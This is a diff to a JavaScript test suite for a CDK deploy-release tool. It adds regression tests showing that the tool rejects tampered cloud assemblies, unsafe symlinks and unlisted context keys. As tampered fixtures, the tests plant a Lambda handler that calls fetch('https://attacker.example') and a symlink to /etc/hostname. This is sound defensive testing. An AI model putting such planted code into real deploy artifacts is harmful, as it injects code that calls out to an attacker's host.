@@ -64,16 +64,29 @@ const stubAws = ({ account = ACCOUNT, stsStatus = 0, stsStderr = '', domainBody 
       ? { status: stsStatus, stdout: JSON.stringify({ Account: account }), stderr: stsStderr }
       : { status: domainStatus, stdout: JSON.stringify(domainBody), stderr: domainStderr };
 
-/** A deterministic fake cloud assembly, shared by producer and consumer tests so digests match. */
+/**
+ * A deterministic fake cloud assembly, shaped like the real one: the cloud manifest, templates,
+ * an asset manifest and a Lambda bundle under `asset.<hash>/`. Round 5 is why the shape matters —
+ * a digest that covered only the root templates bound almost nothing CDK actually consumes.
+ */
 const ASSEMBLY_FILES = {
+  'manifest.json': '{"version":"36.0.0","artifacts":{"ApiStack":{"type":"aws:cloudformation:stack"}}}',
   'DataStack.template.json': '{"Resources":{"Table":{"Type":"AWS::DynamoDB::Table"}}}',
   'IdentityStack.template.json': '{"Resources":{"Pool":{"Type":"AWS::Cognito::UserPool"}}}',
+  'ApiStack.assets.json': '{"version":"36.0.0","files":{"abc123":{"source":{"path":"asset.abc123"}}}}',
+  'asset.abc123/index.mjs': 'export const handler = async () => ({ statusCode: 200 });',
 };
 
+/** Writes nested paths; a value of {symlink: target} plants a symlink instead of a file. */
 function withDir(files, fn) {
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cba-asm-'));
   try {
-    for (const [name, body] of Object.entries(files)) fs.writeFileSync(path.join(dir, name), body);
+    for (const [name, body] of Object.entries(files)) {
+      const dest = path.join(dir, name);
+      fs.mkdirSync(path.dirname(dest), { recursive: true });
+      if (body && typeof body === 'object' && body.symlink) fs.symlinkSync(body.symlink, dest);
+      else fs.writeFileSync(dest, body);
+    }
     return fn(dir);
   } finally {
     fs.rmSync(dir, { recursive: true, force: true });
@@ -734,21 +747,129 @@ test('deploy-release deploys the VERIFIED ASSEMBLY in the VERIFIED REGION — bo
       env: { PATH: '/usr/bin', AWS_REGION: 'us-west-2', AWS_DEFAULT_REGION: 'us-west-2', CDK_DEFAULT_REGION: 'us-west-2' },
       exec: (args, childEnv) => {
         execs.push({ args, childEnv });
+        // ROUND-5 REPRO (check/use): mutate the ORIGINAL assembly while the child would run. The
+        // snapshot the child was handed must still carry the verified digest.
+        fs.writeFileSync(path.join(asm, 'asset.abc123', 'index.mjs'), 'export const handler = () => "evil";');
+        const snapDigest = require('../bin/deploy-preflight').assemblyDigest(args[args.indexOf('--app') + 1]);
+        execs[execs.length - 1].snapDigest = snapDigest.digest;
         return { status: 0 };
       },
     });
     assert.equal(r.exit, 0, r.output);
     assert.equal(execs.length, 1, 'exactly one deploy');
     const { args, childEnv } = execs[0];
-    // The child deploys the digested assembly via --app — never mutable source, never a -c flag.
-    assert.deepEqual(args, ['cdk', 'deploy', '--all', '--require-approval', 'never', '--app', asm]);
+    // The child deploys a PRIVATE SNAPSHOT via --app — never the original mutable path, never
+    // source. The check-to-use window on the original directory is what round 5 closed.
+    assert.deepEqual(args.slice(0, 5), ['cdk', 'deploy', '--all', '--require-approval', 'never']);
+    assert.equal(args[5], '--app');
+    const appPath = args[6];
+    assert.notEqual(appPath, asm, 'the original assembly path must never be reopened by the child');
     // ROUND-4 REPRO 2 (region): the ambient environment said us-west-2 everywhere; the verified
     // region is imposed on every variable the CDK or the SDK reads.
     assert.equal(childEnv.AWS_REGION, 'us-east-1');
     assert.equal(childEnv.AWS_DEFAULT_REGION, 'us-east-1');
     assert.equal(childEnv.CDK_DEFAULT_REGION, 'us-east-1');
     assert.equal(childEnv.PATH, '/usr/bin', 'the rest of the environment passes through');
+    assert.equal(execs[0].snapDigest, capturedManifest().assemblyDigest, 'the deployed snapshot carries the verified digest even after the original was mutated');
   });
+});
+
+test('ROUND-5 REPRO: every deploy-relevant file is bound — asset bytes, asset manifest and cloud manifest', () => {
+  // Each of these mutations left the OLD digest unchanged, because it hashed only the root
+  // templates: different BFF Lambda bytes could deploy under the reviewed assembly identity.
+  for (const [label, over] of [
+    ['the Lambda bundle bytes', { 'asset.abc123/index.mjs': 'export const handler = () => fetch("https://attacker.example");' }],
+    ['the asset manifest', { 'ApiStack.assets.json': '{"version":"36.0.0","files":{"abc123":{"source":{"path":"asset.evil"}}}}' }],
+    ['the cloud manifest', { 'manifest.json': '{"version":"36.0.0","artifacts":{}}' }],
+    ['an added file', { 'asset.abc123/extra.mjs': 'export const smuggled = 1;' }],
+  ]) {
+    withRelease(
+      (p2, asm) => {
+        const r = runDeployRelease(releaseArgs(p2, asm), {
+          run: stubAws(),
+          git: happyGit(),
+          cdkJsonPath: CDK_JSON,
+          exec: () => assert.fail(`a drifted assembly (${label}) must never reach a deploy`),
+        });
+        assert.equal(r.exit, 1, label);
+        assert.match(r.output, /ASSEMBLY_DIGEST_MISMATCH/, label);
+      },
+      { assemblyFiles: { ...ASSEMBLY_FILES, ...over } },
+    );
+  }
+
+  // A REMOVED file changes the digest too.
+  const withoutAsset = { ...ASSEMBLY_FILES };
+  delete withoutAsset['asset.abc123/index.mjs'];
+  withRelease(
+    (p2, asm) => {
+      const r = runDeployRelease(releaseArgs(p2, asm), { run: stubAws(), git: happyGit(), cdkJsonPath: CDK_JSON, exec: () => assert.fail('must not exec') });
+      assert.equal(r.exit, 1);
+      assert.match(r.output, /ASSEMBLY_DIGEST_MISMATCH/);
+    },
+    { assemblyFiles: withoutAsset },
+  );
+
+  // A symlink inside the assembly is refused outright — it is a path for content to escape the digest.
+  withRelease(
+    (p2, asm) => {
+      const r = runDeployRelease(releaseArgs(p2, asm), { run: stubAws(), git: happyGit(), cdkJsonPath: CDK_JSON, exec: () => assert.fail('must not exec') });
+      assert.equal(r.exit, 1);
+      assert.match(r.output, /ASSEMBLY_UNSAFE_ENTRY/);
+    },
+    { assemblyFiles: { ...ASSEMBLY_FILES, 'asset.abc123/link.mjs': { symlink: '/etc/hostname' } } },
+  );
+});
+
+test('the context contract cannot be read around — tryGetContext is confined and keys are literal', () => {
+  // ROUND-5 REPRO: `this.node.tryGetContext('newDeployTarget')` produced no discovered key under
+  // the old scanner. Three fences now: the scanner sees tryGetContext too (proven on a planted
+  // source), direct tryGetContext is forbidden outside the central helper, and getContext refuses
+  // unlisted keys at runtime, so an unbound read fails synth loudly.
+  const scan = (src) => {
+    // The ONE sanctioned non-literal shape is the forwarding wrapper definition itself:
+    //   const ctx = (key, fallback) => getContext(this.node, key, fallback);
+    // Everything else must name its key as a literal, or it cannot join the discovery set.
+    const withoutWrapper = src.replaceAll('const ctx = (key, fallback) => getContext(this.node, key, fallback);', '');
+    const keys = [];
+    const nonLiteral = [];
+    for (const m of withoutWrapper.matchAll(/(?:\bctx|getContext|tryGetContext)\(\s*(?:this\.node\s*,\s*|node\s*,\s*)?('([^']+)'|[^)'\s][^),]*)/g)) {
+      if (m[2] !== undefined) keys.push(m[2]);
+      else nonLiteral.push(m[1]);
+    }
+    return { keys, nonLiteral };
+  };
+
+  // The scanner DOES see the native-API bypass and non-literal keys — proven, not assumed.
+  assert.deepEqual(scan("this.node.tryGetContext('newDeployTarget')").keys, ['newDeployTarget']);
+  assert.equal(scan('getContext(this.node, someVariable)').nonLiteral.length, 1);
+
+  const libDir = path.join(__dirname, '..', 'lib');
+  const discovered = new Set();
+  for (const f of fs.readdirSync(libDir).filter((n) => n.endsWith('.js'))) {
+    const src = fs.readFileSync(path.join(libDir, f), 'utf8');
+    if (f !== 'context.js') {
+      assert.equal(src.includes('tryGetContext'), false, `${f} must go through the central getContext helper`);
+      const { keys, nonLiteral } = scan(src);
+      assert.deepEqual(nonLiteral, [], `${f} must use literal context keys`);
+      for (const k of keys) discovered.add(k);
+    }
+  }
+  for (const f of fs.readdirSync(path.join(__dirname, '..', 'bin')).filter((n) => n.endsWith('.js'))) {
+    assert.equal(fs.readFileSync(path.join(__dirname, '..', 'bin', f), 'utf8').includes('tryGetContext'), false, `bin/${f} must not read context directly`);
+  }
+  discovered.delete('environment');
+
+  // BOTH directions: everything consumed is declared, and everything declared is consumed — a
+  // declared-but-dead key is an entry an attacker could activate without the digest noticing.
+  for (const k of discovered) assert.ok(DEPLOY_CONTEXT_KEYS.includes(k), `context key "${k}" must join the closed deploy contract`);
+  for (const k of DEPLOY_CONTEXT_KEYS) assert.ok(discovered.has(k), `declared key "${k}" is consumed by no stack`);
+
+  // Runtime refusal, as defense in depth: an unlisted key fails synth loudly.
+  const { getContext } = require('../lib/context');
+  const fakeNode = { tryGetContext: () => undefined };
+  assert.throws(() => getContext(fakeNode, 'newDeployTarget', 'x'), /outside the closed deploy contract/);
+  assert.equal(getContext(fakeNode, 'githubRepo', 'fallback'), 'fallback');
 });
 
 test('ROUND-4 REPRO 1: a manifest naming a release the worktree is NOT at is refused before exec', () => {
